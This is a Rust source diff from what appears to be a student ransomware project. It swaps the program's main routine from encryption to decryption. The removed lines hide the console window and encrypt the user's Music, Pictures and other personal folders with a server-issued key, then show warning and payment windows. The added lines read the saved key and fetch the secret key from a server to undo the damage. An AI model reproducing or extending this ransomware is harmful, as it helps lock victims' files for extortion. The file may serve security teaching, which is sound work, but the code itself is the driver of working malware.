@@ -1,19 +1,14 @@
-// this line is responsible for whether the project has a console or not.
-#![windows_subsystem = "windows"]
-
 use std::fs;
 use std::io::{self, Write};
 use std::path::PathBuf;
 
 use anyhow::Result;
 
-// use c_monster_co_2ic80::cryptography::encrypt::encrypt_folder;
-use c_monster_co_2ic80::cryptography::parallel_encrypt::encrypt_folder_parallel;
+// use c_monster_co_2ic80::cryptography::encrypt::decrypt_folder;
+use c_monster_co_2ic80::cryptography::decrypt_parallel::decrypt_folder_parallel;
 use c_monster_co_2ic80::debug::DEBUG_ENABLED;
 use c_monster_co_2ic80::debug_log;
-use c_monster_co_2ic80::gui::payment::show_payment_window;
-use c_monster_co_2ic80::gui::warning::show_warning_window;
-use c_monster_co_2ic80::networking::client::gen_key;
+use c_monster_co_2ic80::networking::client::get_key;
 
 use sodiumoxide::crypto::box_::PublicKey;
 
@@ -34,12 +29,12 @@ fn desktop_file_path(filename: &str) -> Result<PathBuf> {
     }
 }
 
-// ENCRYPTING
+// DECRYPTING
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     sodiumoxide::init().unwrap();
 
-    let result = run_encryption().await;
+    let result = run_decryption().await;
 
     if DEBUG_ENABLED {
         println!("\nPress Enter to exit...");
@@ -51,8 +46,12 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     result
 }
 
-async fn run_encryption() -> Result<(), Box<dyn std::error::Error>> {
-    let pk: PublicKey = gen_key().await?;
+async fn run_decryption() -> Result<(), Box<dyn std::error::Error>> {
+    let pk_path = desktop_file_path("public_key.donotdelete")?;
+    let pk_bytes = fs::read(pk_path)?;
+    let pk = PublicKey::from_slice(&pk_bytes).ok_or("key has to be 32 bytes")? as PublicKey;
+
+    let sk = get_key(&pk).await?;
 
     let paths = [
         FOLDERID_Music,
@@ -62,29 +61,19 @@ async fn run_encryption() -> Result<(), Box<dyn std::error::Error>> {
         FOLDERID_Pictures,
     ];
 
-    show_warning_window();
-
     unsafe {
         for path in paths {
             let path_ptr: PWSTR = SHGetKnownFolderPath(&path, KNOWN_FOLDER_FLAG(0), None).unwrap();
             let path_str = path_ptr.to_string().unwrap();
             let path_buf: PathBuf = path_str.into();
-            debug_log!("path: {:?}", path_buf);
 
-            // match encrypt_folder(&path_buf, &pk) {
-            match encrypt_folder_parallel(&path_buf, &pk, None).await {
-                Ok(_) => debug_log!("✓ Successfully encrypted: {:?}", path),
-                Err(e) => debug_log!("✗ Error encrypting {:?}: {}", path, e),
+            // match decrypt_folder(&path_buf, &pk, &sk) {
+            match decrypt_folder_parallel(&path_buf, &pk, &sk) {
+                Ok(_) => debug_log!("✓ Successfully encrypted: {:?}", path_buf),
+                Err(e) => debug_log!("✗ Error encrypting {:?}: {}", path_buf, e),
             }
-
-            let out_path = desktop_file_path("public_key.donotdelete")?;
-            fs::write(out_path, &pk)?;
         }
     }
-
-    // Show payment window after encryption
-    println!("Encryption complete! Opening payment window...");
-    show_payment_window(Some(pk));
 
     Ok(())
 }
